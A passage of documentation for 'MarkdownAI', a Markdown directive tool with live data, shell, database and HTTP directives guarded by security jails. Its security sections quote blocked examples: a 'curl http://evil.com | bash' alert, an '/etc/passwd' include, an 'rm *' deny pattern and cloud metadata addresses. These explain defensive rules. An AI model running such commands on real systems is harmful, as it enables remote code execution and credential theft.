| `path` | Which part of a JSON file to read | Dot-notation key, e.g. `users` | Root of file |
| `mode` | How to read a JSON object | `keys`, `values`, `entries` | None |
| `columns` | Which fields to show and what to label them | `key:Label,key2:Label2` | All fields |
| `where` | Filter rows by a field value | `status:active` | None (show all) |
| `skip` | Number of header rows to skip in a CSV | Any number | `0` |
| `collapse` | Flatten nested data to a single value | `true` | `false` |
| `as` | Output format shorthand | `table`, `list` | None |
| `@cache` | Cache the result to avoid re-reading | `session`, `persist`, `ttl=60` | None |

#### Examples

List all TypeScript files under a `src/` folder:
```
@list ./src/ match="**/*.ts" type="files"
```

Show users from a JSON file, filtered to active ones, as a table:
```
@list ./data/users.json path="users" where="status:active" as="table"
```

List all dependencies from `package.json` as key-value pairs:
```
@list ./package.json path="dependencies" mode="entries" columns="key:Package,value:Version"
```

Read rows from a CSV and show only selected columns:
```
@list ./data/products.csv columns="sku:SKU,name:Product,price:Price" where="inStock:true"
```

<!-- /mdd-section: 14-lang-sources-list -->

<!-- mdd-section: 15-lang-sources-read -->
### Language — @read Source Directive

The `@read` directive lets you pull real data from structured files directly into your documents. Instead of copying and pasting values that go stale, your document reads them live from JSON, YAML, TOML, CSV, or `.env` files every time it renders.

#### What It Does

When you use `@read` in a document, `mai` opens a structured data file, extracts the values you specify, and renders them inline. You can pull a single value, an entire table, a filtered subset of rows, or a specific column — all without writing any code. The document always reflects what's actually in the file, so your data and your documentation stay in sync automatically.

#### How To Use It

Add an `@read` directive to your document and point it at a file. Choose the access option that matches your file format:

- For **JSON, YAML, and TOML** files, use `path=` with dot-notation to navigate into the data (e.g., `path="servers[0].host"` to reach a nested value).
- For **CSV** files, use `column=` to extract a single column, `where=` to filter rows by a condition, and `columns=` to select and rename multiple fields.
- For **.env** files, use `key=` to look up a single environment variable by name. Using `path=` on a `.env` file is an error.

You can also use `as=` to control how the output is rendered, `collapse true` to flatten nested objects into a single line, and `@cache` to avoid re-reading the file on every render.

`mai` enforces filesystem confinement and content masking, so sensitive values are protected according to your security settings.

#### Configuration

| Option | Applies To | Description |
|---|---|---|
| `path="dot.notation"` | JSON, YAML, TOML | Navigate to a nested value using dot-notation and `[n]` array indices |
| `key="KEY_NAME"` | .env | Look up a single flat key |
| `column="name"` | CSV | Extract one column; outputs one value per line |
| `where=` | CSV | Filter rows using an expression |
| `columns="key:Label,..."` | CSV | Select and rename multiple columns |
| `collapse true` | Any | Stringify nested objects inline |
| `as="type"` | Any | Control output rendering format |
| `@cache` | Any | Cache the file read result |

#### Examples

Read a single value from a JSON config file:
```
@read config.json path="database.host"
```

Render a CSV as a filtered table showing only active users:
```
@read users.csv where="status='active'" columns="name:Name,email:Email"
```

Pull an environment variable from a `.env` file:
```
@read .env key="API_BASE_URL"
```

<!-- /mdd-section: 15-lang-sources-read -->

<!-- mdd-section: 16-lang-sources-utilities -->
### Language - @tree, @date, @count Utility Directives

Three small directives that handle things you'd otherwise hardcode and forget to update: directory structure, timestamps, and file counts. Each one pulls live data at render time so your docs stay accurate without manual maintenance.

#### What It Does

`@tree` renders an ASCII directory tree for any path in your project. `@date` injects the current time - or a file's last-modified time - in whatever format you need. `@count` tallies files or directories that match a glob pattern. All three are read-only and subject to the same filesystem confinement rules as `@read` and `@include`.

#### How To Use It

**@tree**

```
@tree ./src/ depth=2 match="*.ts"
```

- `depth` limits how many levels down it descends (omit for full tree)
- `match` filters entries by glob - only matching files appear
- Output uses standard ASCII box characters: `├──`, `└──`, `│`

Useful in architecture docs where you want the actual current structure, not a diagram you drew months ago.

**@date**

```
@date
@date format="YYYY-MM-DD"
@date file="./src/parser.ts" type="modified"
```

Without arguments, `@date` outputs the current date and time in ISO 8601 format. Add `format` to control the output using these tokens:

| Token | Output |
|-------|--------|
| `YYYY` | Full year |
| `MM` | Month (zero-padded) |
| `DD` | Day (zero-padded) |
| `HH` / `hh` / `h` | Hour (24h / 12h padded / 12h no pad) |
| `mm` | Minutes |
| `ss` | Seconds |
| `A` / `a` | AM/PM / am/pm |
| `zzz` / `z` | Timezone abbreviation (e.g. UTC, EST) |
| `Z` / `ZZ` | Offset as +HH:mm / +HHmm |
| `X` / `x` | Unix seconds / milliseconds |
| `ISO` | Full ISO 8601 |
| `date` | YYYY-MM-DD shorthand |

The `file` option combined with `type="modified"` gives you the last-modified timestamp for a specific file. `type` defaults to `current` - there is no `created` option. If you use `type="created"`, the parser throws an error: `created is unreliable on Linux; use git log instead`.

To get a file's creation date from git history, use:

```
@query "git log --follow --format=%aI --diff-filter=A -- ./src/parser.ts | tail -1"
```

You can also use `@date` inline inside expressions:

```
Last updated: {{ date format="MMMM DD, YYYY" }}
```

**@count**

```
@count ./src/ match="**/*.ts"
@count ./src/ match="**/*.ts" type=files
@count ./tests/ match="**/" type=dirs
```

`type` accepts `files` (default), `dirs`, or `both`. Use this to show live file counts in docs - for example, how many source files are in a package or how many test suites exist.

For counting rows in JSON, CSV, or database results, pipe through `wc -l` instead:

```
@query "cat ./data/records.csv | wc -l"
```

Inline use works the same way:

```
This package contains {{ count ./src/ match="**/*.ts" }} TypeScript files.
```

#### Examples

**Project structure in an architecture doc:**

```
## Source Layout

@tree ./packages/ depth=2
```

Renders the live directory tree every time the doc is built - no stale diagrams.

**Auto-updating changelog header:**

```
# Changelog

Last generated: @date format="YYYY-MM-DD HH:mm z"
```

**Test suite coverage note:**

```
The test suite currently covers {{ count ./src/ match="**/*.ts" }} source files
across {{ count ./tests/ match="**/" type=dirs }} test suites.
```

Both counts update automatically as files are added or removed.

<!-- /mdd-section: 16-lang-sources-utilities -->

<!-- mdd-section: 17-lang-connect -->
### Language — @connect Database Registry

The `@connect` directive lets you define named database connections once at the top of a document and reuse them by name throughout. This keeps your credentials out of the document body and makes it safe to commit your files — connections always reference environment variables, never hardcoded secrets.

#### What It Does

`@connect` acts as a connection registry for your document. You declare each database connection — giving it a name, a type, and an environment variable that holds the URI — and then any `@db` query block in the document can refer to it by name. You can also scope a connection locally to a single included file using the `@local` modifier, preventing it from leaking into the parent document.

#### How To Use It

1. At the top of your document, declare each connection you need using `@connect`, giving it a name, a database type, and a reference to an environment variable that holds the connection string.
2. In your `@db` query blocks, reference the connection by name using `using="name"`. If you only have one connection defined, `@db` will use it automatically.
3. Use the `@local` modifier on any connection that should stay private to the current file and not be visible to parent documents that include it.
4. Make sure the environment variable referenced in your connection (e.g. `MONGODB_URI`) is set in your environment before running `mai`.

When `mai` renders to static output, all `@connect` directives are stripped — they have no meaning outside a live document context.

#### Configuration

| Option | Description |
|--------|-------------|
| `uri=env.VAR_NAME` | Environment variable holding the database connection string. Never hardcode the URI directly. |

#### Examples

Define a MongoDB connection and use it in a query:

```
@connect reports type="mongodb" uri=env.MONGODB_URI
```

Define a local-scoped Postgres connection in an included file (won't bubble up to the parent document):

```
@connect staging type="postgres" uri=env.STAGING_PG_URI @local
```

Use a named connection in a query block, or rely on automatic resolution when only one connection is defined:

```
@db using="reports"
  db.orders.find({ status: "pending" })
@end
```

**Supported database types:** `mongodb`, `postgres`, `mysql`, `mssql`, `sqlite`, `redis`, `elasticsearch`

<!-- /mdd-section: 17-lang-connect -->

<!-- mdd-section: 18-lang-sources-db -->
### Language — @db Database Query Directive

The `@db` directive lets you embed live database queries directly inside a Markdown document. Instead of copying data out of a database and pasting it into your docs, your document fetches it fresh every time — so the data is always accurate.

#### What It Does

When you add an `@db` block to your document, MarkdownAI connects to a database you specify, runs your query, and injects the results directly into the rendered output. Results can be filtered, reshaped, formatted, and piped into other parts of the document. Because `@db` is a jailed directive, it is stripped out (disabled) by default and must be explicitly enabled in your security settings before it will run — keeping untrusted documents safe.

#### How To Use It

1. Enable `@db` in your security settings by adding it to `~/.markdownai/security.json`.
2. Set up a named connection using the `@connect` directive (see the @connect feature), or supply a connection URI directly with `uri=env.YOUR_VAR`.
3. Add an `@db` block to your document with a `query` and any optional options.
4. Use `columns` to pick and rename the fields you want in the output.
5. Use `where` to filter the results after the query runs.
6. Optionally add `@cache` to cache results so you can work offline without a live database connection.

#### Configuration

| Option | Description |
|---|---|
| `using="name"` | Name of a connection registered with `@connect` |
| `uri=env.VAR` | Inline connection URI from an environment variable (no `@connect` needed) |
| `query="..."` | The query to run — MongoDB or SQL depending on the connection type |
| `columns="field:Label,..."` | Select specific result fields and rename them for display |
| `where="expression"` | Post-query filter applied to the results (for best performance, filter in the query itself) |
| `as="type"` | Shorthand to render results in a specific format (e.g., table, chart) |
| `@cache session\|persist\|ttl=N\|mock=./file.json` | Cache results for the session, permanently, for N seconds, or use a local mock file |

#### Examples

Query a named database connection and display results as a table:
```
@db using="my-mongo" query="{ status: 'active' }" as="table"
```

Query using an inline connection URI from an environment variable, select two fields, and filter the results:
```
@db uri=env.DB_URI query="SELECT * FROM orders" columns="id:Order ID,total:Amount" where="total > 100"
```

Seed real data once and develop offline using a cached mock file:
```
@db using="prod-db" query="{ region: 'US' }" @cache mock=./data/us-results.json
```

<!-- /mdd-section: 18-lang-sources-db -->

<!-- mdd-section: 19-lang-sources-http -->
### Language — @http HTTP Request Directive

The `@http` directive lets you embed live data from any web API or HTTP endpoint directly in your markdown document. Instead of copying and pasting API responses that go stale, your document fetches the data fresh every time it runs — so your documentation always reflects reality.

#### What It Does

When you include an `@http` directive in your document, `mai` makes an HTTP request to the URL you specify and injects the response inline. You can pull a JSON field from a REST API, filter rows from a JSON array, or pipe raw text into a rendering step. By default, the directive is "jailed" — it produces no output unless the target domain has been explicitly added to your personal allowlist, keeping documents safe to share without worrying about unexpected outbound calls.

#### How To Use It

Add the `@http` directive anywhere in your document where you want live data to appear. The only required option is `url`. You can use a literal URL or reference an environment variable so credentials and endpoints never appear in the document source. For JSON responses, use `path` to extract a nested field, or `columns` and `where` to slice and filter an array. To enable a domain, add it to your allowlist in `~/.markdownai/security.json` — without that entry, the directive is silently removed from output.

#### Configuration

| Option | Description | Default |
|---|---|---|
| `url="..."` or `url=env.VAR` | The endpoint to call. Required. | — |
| `method="GET\|POST\|PUT\|DELETE"` | HTTP verb. POST, PUT, and DELETE require explicit permission in your security config. | `GET` |
| `path="dot.notation"` | Dot-path selector into a JSON response object. | — |
| `body='{"key":"value"}'` | Request body. Only valid when method is not GET. | — |
| `headers="Key=env.VAR,Key2=value"` | Comma-separated request headers. Literal credentials are masked automatically. | — |
| `timeout=5000` | Request timeout in milliseconds. | Security config default |
| `columns="field:Name"` | Select and rename fields from a JSON array response. | — |
| `where="expression"` | Filter rows from a JSON array response. | — |
| `as="type"` | Shorthand for piping output into a render step (e.g. `table`, `chart`). | — |
| `@cache session\|persist\|ttl=N\|mock=./file.json` | Control caching or substitute a local mock file during development. | — |

#### Examples

Fetch a single field from a JSON API:
```
@http url="https://api.example.com/status" path="version"
```

Pull data from an authenticated endpoint using an environment variable for the token:
```
@http url=env.API_URL headers="Authorization=env.API_TOKEN" path="data.summary"
```

Fetch a JSON array, filter it, and render it as a table:
```
@http url="https://api.example.com/deployments" columns="env:Environment,status:Status,ts:Deployed At" where="status == 'failed'" as="table"
```

<!-- /mdd-section: 19-lang-sources-http -->

<!-- mdd-section: 20-lang-sources-query -->
### Language — @query Shell Command Directive

The `@query` directive lets you embed the output of any shell command directly into your MarkdownAI document. This solves the problem of documentation going stale — instead of manually updating things like the last git commit, dependency audit results, or running container list, your document fetches that data live every time it renders.

#### What It Does

When your document is rendered, `@query` runs a shell command on your machine and inserts its standard output into the document at that point. The result is fully pipeable, meaning you can chain it into other MarkdownAI directives for further transformation. To keep your system safe, every command must appear on an allowlist you control — any command not on the list is silently stripped from output rather than executed.

#### How To Use It

Place `@query` inline in your document with the shell command you want to run in double quotes. If the command exits with an error, the directive produces an empty string and logs a warning — your document still renders. Pass `--strict` when rendering if you want errors to stop the build instead. Pass `--verbose` to see stderr output from commands.

To allow a command, add its pattern to `~/.markdownai/security.json` under the shell allowlist. Built-in block rules prevent inherently dangerous commands regardless of your allowlist.

You can control caching by appending `@cache` as the last modifier:
- `@cache session` — cache for the current render session
- `@cache persist` — cache across sessions
- `@cache ttl=N` — cache for N seconds
- `@cache mock=./file.json` — use a local file instead of running the command (useful for offline or CI use)

#### Examples

Embed the most recent git commit hash into your docs:
```
@query "git log --oneline -1"
```

Show when a file was first added to the repository:
```
@query "git log --follow --format=%aI --diff-filter=A -- ./README.md | tail -1"
```

Include a live npm dependency audit summary, cached for the session:
```
@query "npm audit --json" @cache session
```

List running Docker containers:
```
@query "docker ps --format json"
```

<!-- /mdd-section: 20-lang-sources-query -->

<!-- mdd-section: 21-lang-phases -->
### Language — @phase, @on complete, and @graph

The `@phase` directive lets you divide a `mai` document into named workflow stages, each with its own content and transition rules. Only the active phase loads into AI context at a time, keeping large documents fast and focused. `@graph` gives you a visual map of your workflow using a diagram block — for documentation purposes only.

#### What It Does

When you write a multi-step workflow in a `mai` document — an onboarding guide, a multi-stage pipeline, a troubleshooting runbook — phases let you break it into distinct named sections. Each phase can contain any `mai` directives, and you define what happens when a phase completes: move to another phase or call a macro. The MCP server automatically loads only the currently active phase into AI context, so your AI assistant sees exactly what is relevant right now rather than the entire document at once. The `@graph` block lets you draw a Mermaid diagram of your workflow for human readers; it has no effect on how phases actually run.

#### How To Use It

1. Declare a phase with `@phase <name>` and close it with `@end`.
2. Put any `mai` directives inside the phase body — fetches, macros, includes, plain markdown.
3. Add one or more `@on complete` lines inside the phase to define what happens next:
   - Transition to another phase: `@on complete -> next-phase-name`
   - Call a macro: `@on complete -> @call macro_name`
4. Multiple `@on complete` lines in the same phase execute sequentially, top to bottom.
5. Phases are optional — a document with no `@phase` blocks loads in its entirety.
6. Optionally, add a `mai-graph` fenced code block anywhere in the document to render a Mermaid diagram illustrating the flow. This is purely visual and does not control execution.

**Restrictions:**
- `@phase` blocks are only valid in the root document. Using `@phase` inside an `@import`-ed file causes a parse error. Using it inside an `@include`-d file is allowed but the phase tags are stripped and the body renders as normal content.
- `@on complete` is only valid inside a `@phase ... @end` block.

#### Examples

**Basic two-phase document:**
```
@phase intake
  @fetch https://api.example.com/tickets/open
  @on complete -> triage
@end

@phase triage
  @call summarize_tickets
  @on complete -> @call notify_team
@end
```

**Phase with multiple completion actions:**
```
@phase review
  @on complete -> archive
  @on complete -> @call send_summary
@end
```

**Workflow diagram (documentation only):**
````
```mai-graph
graph LR
  intake --> triage --> review --> archive
```
````

<!-- /mdd-section: 21-lang-phases -->

---

### Security

<!-- mdd-section: 22-security-config -->
### Security — Config File, Runtime Modes, Audit Log

MarkdownAI applies a "jail-first" security model: all dynamic document operations — database queries, HTTP requests, and SQL — are blocked by default unless you explicitly allow them. This protects you from accidentally running untrusted or malicious documents on your system. You control exactly what each document is permitted to do through a single configuration file on your machine.

#### What It Does

When you render or run a MarkdownAI document, the engine evaluates every dynamic directive (such as database queries or HTTP fetches) against your personal security rules before executing anything. Directives that are not explicitly permitted are silently stripped out rather than executed. The engine writes a permanent, tamper-proof audit log of all security-relevant events so you always have a record of what was allowed or blocked. Critical alerts — such as attempts to use always-blocked operations — are always printed to your terminal and cannot be suppressed by any document or configuration option.

#### How To Use It

1. Open (or create) the file `~/.markdownai/security.json` to configure your security rules.
2. Add the hostnames, query types, or patterns you want to permit to the allowlist. Anything not on the allowlist is stripped.
3. Add patterns you want to explicitly deny to the deny list — these are blocked with a warning even if they would otherwise pass.
4. Choose a runtime mode when running `mai` to control how much information you see during execution.
5. Review `~/.markdownai/audit.log` at any time to see a history of every security decision the engine made.

#### Commands

| Flag | Mode | Behavior |
|---|---|---|
| *(none)* | Silent | Blocked directives are stripped quietly; security events go to the log file only |
| `--verbose` | Verbose | Warnings and security events are also printed to your terminal as they happen |
| `--strict` | Strict | Any stripped directive is treated as an error and halts execution immediately |

#### Configuration

| File | Purpose |
|---|---|
| `~/.markdownai/security.json` | Your personal security rules — allowlists, deny patterns, and preferences |
| `~/.markdownai/audit.log` | Permanent log of every security event; cannot be disabled by documents or config |
| `~/.markdownai/runtime.log` | All warnings and above from every run, stored as structured JSON entries |

#### Examples

Run a document in the default silent mode (blocked directives stripped, no terminal noise):
```
mai render report.md
```

Run with verbose output to see security warnings as they happen:
```
mai render report.md --verbose
```

Run in strict mode so any blocked directive stops the render immediately:
```
mai render report.md --strict
```

<!-- /mdd-section: 22-security-config -->

<!-- mdd-section: 23-security-filesystem -->
### Security — Filesystem Confinement and Content Masking

MarkdownAI protects you from accidentally exposing sensitive files or credentials when your documents include or import other files. Two independent layers of protection work together: one controls which files your documents are allowed to read, and the other automatically masks any secrets found in the content that is returned.

#### What It Does

When your document uses `@include`, `@import`, or `@read` to pull in external content, every file access passes through two mandatory security layers that cannot be turned off. The first layer — confinement — restricts access to files within the same directory as your document, blocking any attempt to navigate outside that boundary or reference absolute paths. The second layer — content masking — scans the returned file content for credentials, tokens, connection strings, and other secrets before they ever reach your rendered output, replacing matched values with `***MASKED***`. This means that even if a file is allowed through, any sensitive values inside it are redacted automatically before you see them.

#### How To Use It

Both layers are always active with no setup required. When you run `mai`, the document's own directory becomes the access boundary by default. If you need to include files from a parent directory, use the `--allow-traversal` flag with a specific path on each invocation — this deliberately requires you to opt in every time rather than making it a persistent setting.

#### Configuration

| Option | What It Controls |
|---|---|
| `--allow-traversal <path>` | Permits access to one specific directory outside the document root. Must be provided on every invocation. |
| `allow_unmasked_paths` | Glob patterns for files that skip content masking entirely (set in security config). |
| `allow_unmasked_patterns` | Variable name patterns whose values are restored after masking (e.g. `NODE_ENV=*`, `PORT=*`). |
| `--cwd <path>` | Overrides the document root used as the confinement boundary. |

#### Examples

**Include a file from within the document's directory (always allowed):**
```
@include ./data/report.csv
```

**Include a file from a parent directory (requires explicit flag):**
```
mai render report.md --allow-traversal ../shared-data/
```

**A blocked attempt — absolute paths are always rejected:**
```
@include /etc/passwd
<!-- SECURITY_ALERT: absolute paths are blocked -->
```

<!-- /mdd-section: 23-security-filesystem -->

<!-- mdd-section: 24-security-shell -->
### Security - Shell Execution Jail (@query)

The shell execution jail controls which commands `@query` is allowed to run. By default, shell execution is completely disabled - nothing runs until you explicitly turn it on and define what's permitted. The jail uses an allowlist-first model, so commands are blocked unless they match a pattern you approve.

#### What It Does

When a document contains an `@query` directive, the engine checks the command against three layers before running anything:

1. **Built-in blocks** - A hardcoded list of always-blocked and always-alerted patterns that cannot be overridden by any config. These catch commands like credential theft, metadata endpoint access, and destructive system calls.
2. **Deny patterns** - Your configured `deny_patterns` list. A match here blocks the command, even if it also matches an allow pattern. Deny wins.
3. **Allow patterns** - Your configured `allow_patterns` list. The command must match at least one pattern here to proceed.

If shell is disabled (`"enabled": false`), all `@query` directives are stripped from output silently. No commands run, no errors - the directive just produces nothing.

#### How To Use It

Enable shell execution and configure your allowlist through the `mai security shell` commands or by editing your security config directly. Start with the most specific patterns you can - `git log --oneline *` rather than `git *` - and only broaden if you need to.

The config lives in the security section of your project config:

```json
{
  "shell": {
    "enabled": true,
    "allow_patterns": ["git log *", "npm audit *"],
    "deny_patterns": ["rm *"],
    "allow_network": false,
    "require_confirmation": false,
    "audit_log": true
  }
}
```

Before adding a pattern to production use, test it with `mai security shell test`. The command exits with code 0 if allowed and code 1 if blocked, so you can use it in scripts and CI checks.

#### Commands

| Command | Description | Flags |
|---------|-------------|-------|
| `mai security shell enable` | Turn on shell execution | - |
| `mai security shell add "<pattern>"` | Add a glob pattern to the allowlist | - |
| `mai security shell remove "<pattern>"` | Remove a pattern from the allowlist | - |
| `mai security shell list` | Show current allowlist and deny patterns | - |
| `mai security shell test "<command>"` | Test whether a command would be allowed or blocked, with reason | Exits 1 if blocked |

#### Configuration

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `enabled` | boolean | `false` | Master switch. When false, all `@query` directives are stripped. |
| `allow_patterns` | string[] | `[]` | Glob patterns a command must match to run. |
| `deny_patterns` | string[] | `[]` | Glob patterns that block a command, checked after the allowlist. Deny always wins. |
| `allow_network` | boolean | `false` | Whether commands in `@query` can make network calls. |
| `require_confirmation` | boolean | `false` | Prompt for user confirmation before each command runs. |
| `audit_log` | boolean | `true` | Write a log entry for every command attempt - allowed or blocked. |

#### Examples

**Check what a git command would do before adding it:**

```bash
mai security shell test "git log --oneline -1"
# → ALLOWED: matches pattern "git log *"

mai security shell test "git push origin main"
# → BLOCKED: no matching allow pattern
# exit code: 1
```

**Set up a read-only git + audit workflow:**

```bash
mai security shell enable
mai security shell add "git log *"
mai security shell add "git diff *"
mai security shell add "git status"
mai security shell add "npm audit *"
```

With this config, a document can report on recent commits, show diffs, and surface dependency vulnerabilities - but cannot push, install, or delete anything.

<!-- /mdd-section: 24-security-shell -->

<!-- mdd-section: 25-security-database -->
### Security - Database Query Jail (@db)

The database query jail controls exactly which operations your `@db` directives can run. Each connection gets its own config, and every connection starts readonly by default. If a query tries to mutate data, it gets blocked before it ever touches the database.

#### What It Does

When a document contains a `@db` directive, the engine checks the query against three layers of rules before executing:

1. **Always-blocked patterns** - hardcoded, cannot be overridden. These cover destructive operations like `DROP DATABASE`, `TRUNCATE`, `deleteMany()`, `db.admin()`, and shutdown commands.
2. **Denied keywords** - your own list of patterns to block per connection.
3. **Allowed operations** - an explicit whitelist of permitted operations. If `allowed_operations` is set, anything not on the list is blocked.

Optionally you can restrict which collections a connection may touch via `allowed_collections`. Queries targeting unlisted collections are rejected.

#### How To Use It

Add a `db` section to your security config for each named connection. The connection name matches the one you reference in `@db` directives. Keep `readonly: true` unless you have a specific reason to allow writes - there are very few cases where a document needs to mutate data.

Use `mai security db test` to check whether a specific query would be allowed before you deploy a document. This is the fastest way to catch misconfigurations.

#### Commands

| Command | Description | Flags |
|---------|-------------|-------|
| `mai security db add <connection>` | Add a new jail config for a connection | - |
| `mai security db set <connection>.<option> <value>` | Set a config value on a connection | - |
| `mai security db allow-collection <connection> <name>` | Whitelist a collection for the connection | - |
| `mai security db deny-keyword <connection> <keyword>` | Add a keyword to the deny list | - |
| `mai security db test <connection> "<query>"` | Test whether a query would be allowed or blocked | - |

#### Configuration

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `readonly` | boolean | `true` | Block all write operations for this connection |
| `allowed_operations` | string[] | `[]` (all allowed) | Whitelist of permitted operations. Empty means no whitelist is applied. |
| `denied_keywords` | string[] | `[]` | Additional keywords to block beyond the built-in always-block list |
| `allowed_collections` | string[] | `[]` (all allowed) | Restricts queries to named collections only |
| `max_results` | number | `1000` | Hard cap on the number of results a query can return |

#### Examples

**Basic readonly connection** - allow read operations on specific collections:

```json
{
  "db": {
    "primary": {
      "readonly": true,
      "allowed_operations": ["find", "aggregate", "countDocuments"],
      "allowed_collections": ["products", "orders"],
      "max_results": 1000
    }
  }
}
```

Test a query against it:

```bash
mai security db test primary "db.users.find()"
# BLOCKED - collection 'users' is not in allowed_collections

mai security db test primary "db.products.find({ active: true })"
# ALLOWED
```

**Adding a custom deny rule** - block any query containing a keyword you want to flag:

```bash
mai security db deny-keyword primary DISTINCT
mai security db test primary "db.products.distinct('category')"
# BLOCKED - denied keyword: DISTINCT
```

<!-- /mdd-section: 25-security-database -->

<!-- mdd-section: 26-security-http -->
### Security — HTTP Request Jail (@http)

When your documents fetch live data using `@http`, MarkdownAI enforces strict controls over which requests are allowed. This "HTTP jail" prevents documents from reaching dangerous or unauthorized endpoints, ensuring that live documents cannot be weaponized to exfiltrate data or probe internal networks.

#### What It Does

Every outbound HTTP request made by an `@http` block passes through a security check before it is sent. You control which domains are permitted, which HTTP methods are allowed, and how large responses can be. Certain dangerous endpoints — such as cloud provider metadata services — are permanently blocked and cannot be overridden, no matter how the document or configuration is written. By default, HTTP requests are disabled entirely and must be explicitly enabled, so nothing reaches the network without your consent.

#### How To Use It

Use the `mai security http` commands to manage your HTTP allowlist interactively. Start by enabling HTTP access, then add only the domains your documents need. You can test any URL before using it in a document to confirm whether it will be allowed or blocked.

1. Enable HTTP access: `mai security http enable`
2. Add a domain to the allowlist: `mai security http add-domain <domain>`
3. Remove a domain: `mai security http remove-domain <domain>`
4. Test a URL before using it: `mai security http test "<url>"`

#### Commands

| Command | Description |
|---|---|
| `mai security http enable` | Enable outbound HTTP requests for `@http` blocks |
| `mai security http add-domain <domain>` | Add a domain to the allowlist (e.g. `api.github.com`) |
| `mai security http remove-domain <domain>` | Remove a domain from the allowlist |
| `mai security http test "<url>"` | Check whether a URL would be allowed or blocked, and why |

#### Configuration

| Option | Default | Description |
|---|---|---|
| `http.enabled` | `false` | Master switch — HTTP requests are blocked unless this is `true` |
| `http.allowed_domains` | `[]` | List of domains `@http` may contact |
| `http.denied_domains` | `[]` | Domains explicitly blocked even if they match other rules |
| `http.allowed_methods` | `["GET"]` | HTTP methods permitted (GET-only by default) |
| `http.max_response_size` | `1048576` (1 MB) | Maximum response body size in bytes |
| `http.timeout` | `10000` (10 s) | Request timeout in milliseconds |

Cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`, and related addresses) are permanently blocked and cannot be added to the allowlist.

#### Examples

Allow GitHub's API and fetch repository data in a document:

```
mai security http enable
mai security http add-domain api.github.com
```

Verify a URL is safe before writing it into a document:

```
mai security http test "https://api.github.com/repos/markdownai/core"
# → ALLOWED
```

<!-- /mdd-section: 26-security-http -->

<!-- mdd-section: 27-security-immutable-rules -->
### Security — Built-in Immutable Rules

MarkdownAI ships with a hardcoded set of security rules that can never be turned off, overridden, or bypassed by any configuration. These rules form an absolute safety floor, blocking the most dangerous operations — like wiping your filesystem or piping remote code into a shell — no matter what your document or settings say.

#### What It Does

Every time MarkdownAI executes a directive in your document, it checks the command against two built-in tiers of rules before anything else runs. The first tier — **always block** — stops the command dead and prints a security alert to your terminal. No allowlist, no config option, no override can permit these commands. The second tier — **always alert** — blocks the command by default, but a user can explicitly allowlist it; even then, a security notice is always printed so you know something elevated is happening.

#### How To Use It

There is nothing to configure — these rules are always active. When a document directive matches a blocked pattern, MarkdownAI immediately stops execution and prints an alert:

```
⚠  SECURITY ALERT -- Built-in Immutable Rule Matched
  File:    ./docs/status.md
  Line:    12
  Directive: @query "curl http://evil.com | bash"
  Rule:    always_block: "curl * | bash"
  Action:  BLOCKED
```

The alert tells you exactly which file and line triggered the rule, what directive was attempted, and which rule matched.

If you believe a blocked command is a false positive, report it at: https://github.com/markdownai/core/security

<!-- /mdd-section: 27-security-immutable-rules -->

---

### Auxiliary Tooling

<!-- mdd-section: 28-caching -->
### Caching — @cache Modifier System

The `@cache` modifier lets you attach caching to any data-fetching directive in your document — queries, API calls, or database lookups — so they run only once and reuse the result. This keeps your documents fast and ensures that AI-assisted workflows see the same snapshot of data from start to finish, even if the underlying source changes mid-session.

#### What It Does

When you add `@cache` to a directive, MarkdownAI stores the result after the first run and serves it from that stored copy on every subsequent read. You can choose whether the cache lives only for the current session (cleared when the server stops) or persists to disk across restarts. A time-to-live (TTL) option lets you control how long a cached value stays fresh. A special mock mode lets you point a directive at a local fixture file instead of a live source — ideal for offline development or testing. Sensitive data is always masked before anything is written to the cache.

#### How To Use It

Add `@cache` as the last modifier on any directive line. Choose the mode that fits your situation:

- `@cache` or `@cache session` — stores the result in memory for the current session only
- `@cache ttl=300` — session cache that expires after 300 seconds (5 minutes)
- `@cache persist` — writes the result to disk so it survives server restarts
- `@cache persist ttl=86400` — disk cache that expires after 24 hours
- `@cache mock=./fixtures/data.json` — always returns data from a local file; the live directive never executes

#### Commands

| Command | Description |
|---|---|
| `mai cache show` | List all cached entries |
| `mai cache show input.md` | List cached entries for a specific document |
| `mai cache clear` | Clear all cached entries |
| `mai cache clear --session` | Clear only in-memory session entries |
| `mai cache clear --persist` | Clear only disk-persisted entries |
| `mai cache seed input.md` | Populate the persist cache by running all directives in a document |
| `mai cache seed input.md --env .env.production --directive db` | Seed using a specific env file, for a specific directive type only |

#### Examples

**Cache a database query for the current session:**
```
@db "SELECT count(*) FROM orders WHERE status = 'open'" @cache session
```

**Cache an HTTP call to disk, refreshing every hour:**
```
@http "https://api.example.com/metrics" @cache persist ttl=3600
```

**Use a local fixture instead of hitting a live API:**
```
@http "https://api.example.com/products" @cache mock=./fixtures/products.json
```

**Offline development workflow:**
```bash
mai cache seed input.md --env .env.production   # pull real data into cache once
mai watch input.md                               # develop offline — no DB or network needed
mai cache clear input.md                         # refresh cache when you need fresh data
```

<!-- /mdd-section: 28-caching -->

<!-- mdd-section: 29-stripper -->
### Stripper - mai strip Command

`mai strip` removes all MarkdownAI syntax from a document and outputs clean, standard markdown. It never executes anything - no network requests, no file reads, no directive evaluation. The result is safe to commit, export, or drop into any markdown renderer that doesn't know about MarkdownAI.

**When to use it**

Strip a document before publishing it to a wiki, sharing it with someone who doesn't have `mai` installed, or committing a snapshot to git for review. It's also the right step before feeding a document into tools like Pandoc or Docusaurus that process standard markdown.

**Basic usage**

```bash
# Strip a single file (outputs to stdout)
mai strip input.md

# Strip to a specific output file
mai strip input.md -o output.md

# Strip with environment variables loaded
mai strip input.md --env .env.production -o output.md

# Strip an entire directory
mai strip ./docs/ --env .env.production -o ./dist/
```

**What happens to each directive type**

Most directives are simply removed. The `@phase`/`@end` tags come out but the body text between them stays, so your prose survives intact. Graph blocks, plain markdown, and passthrough content pass through unchanged.

Conditionals are the one case where the stripper makes a decision: it evaluates `@if` conditions against the current environment and keeps the matching branch, discarding the rest. The directive tags themselves are removed either way.

Interpolations like `{{ env.VERSION }}` are resolved if the variable is available, or removed if it isn't.

**The conditional trap - always use --env**

Without `--env`, every unset variable evaluates to an empty string, which is falsy. That means every `@if` condition fails and every `@else` branch renders instead. If your document uses conditionals, running `mai strip` without loading an env file will produce a document that looks subtly wrong - and it won't throw an error, just a warning per unset variable.

Before stripping any document that uses conditionals, run:

```bash
mai validate input.md --env .env.production
```

This reports all unset variables up front so you know what you're working with before stripping.

**What the stripper never does**

